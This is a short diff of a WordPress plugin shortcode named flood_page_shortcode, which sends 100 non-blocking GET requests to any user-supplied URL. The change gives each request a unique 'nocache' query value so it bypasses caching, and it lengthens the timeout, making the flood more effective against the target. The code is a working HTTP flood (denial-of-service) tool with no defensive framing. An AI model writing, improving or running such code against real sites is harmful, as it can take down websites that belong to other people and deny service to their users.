@@ -19,13 +19,14 @@ function flood_page_shortcode() {
 
     if ( isset( $_POST['target_url'] ) ) {
       $target_url = esc_url_raw( $_POST['target_url'] );
-      $unique_url = add_query_arg( 'nocache', time(), $target_url );  
+       
 
       // Perform the flood asynchronously
       for ( $i = 0; $i < 100; $i++ ) {
+        $unique_url = add_query_arg( 'nocache', time().$i, $target_url ); 
         wp_remote_get( $unique_url, array(
           'cache' => false,
-          'timeout' => 1,  // Set a short timeout (in seconds)
+          'timeout' => 10,  // Set a short timeout (in seconds)
           'blocking' => false // Make the request non-blocking
         ) );
       }
